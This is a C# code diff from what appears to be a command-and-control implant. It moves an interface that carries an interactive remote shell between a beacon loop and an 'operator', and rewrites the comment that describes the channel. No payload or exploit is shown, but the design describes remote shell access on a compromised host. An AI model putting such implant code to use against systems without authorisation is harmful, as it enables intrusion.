@@ -12,36 +12,14 @@ namespace Rod.Implant.Internal;
 // ordinary TaskResult.
 //
 // The channel is byte-transparent and the handler is transport-blind: it
-// pumps bytes through an IChannelStream and never touches gRPC, so the wire
-// contract places no interpretation on the traffic. The reference
-// implementation wires the shell's stdio pipes to the channel -- the
-// documented, mainstream mechanism the one-shot shell.exec already uses,
-// which means no pseudo-terminal allocation: the shell runs non-interactively
-// (on Unix shells without a tty there is no prompt or line editing). A
-// PTY-backed handler is a drop-in replacement over the same channel contract.
-
-/// <summary>
-/// The implant-side half of a live task channel: what a channel handler reads
-/// and writes. The beacon loop implements it over the CheckIn stream -- output
-/// chunks frame as ChannelOutput upstream, input arrives as ChannelInput
-/// downstream -- so channel handlers stay transport-blind.
-/// </summary>
-internal interface IChannelStream
-{
-    /// <summary>
-    /// Streams one chunk of the channel's output upstream to the operator.
-    /// Chunk boundaries are the handler's choice; the receiver concatenates.
-    /// </summary>
-    ValueTask WriteOutputAsync(ReadOnlyMemory<byte> data, CancellationToken cancellationToken);
-
-    /// <summary>
-    /// Waits for the next unit of operator input: the bytes the operator sent
-    /// and whether they closed the channel's stdin. A read that returns
-    /// <c>true</c> is terminal; the handler should close its stdin and let
-    /// its process end.
-    /// </summary>
-    ValueTask<(byte[]? Data, bool Eof)> ReadInputAsync(CancellationToken cancellationToken);
-}
+// pumps bytes through an IChannelStream (the registry's channel contract,
+// Capabilities.cs) and never touches gRPC, so the wire contract places no
+// interpretation on the traffic. The reference implementation wires the
+// shell's stdio pipes to the channel -- the documented, mainstream mechanism
+// the one-shot shell.exec already uses, which means no pseudo-terminal
+// allocation: the shell runs non-interactively (on Unix shells without a tty
+// there is no prompt or line editing). A PTY-backed handler is a drop-in
+// replacement over the same channel contract.
 
 /// <summary>
 /// The interactive shell handler: spawns the platform shell with redirected
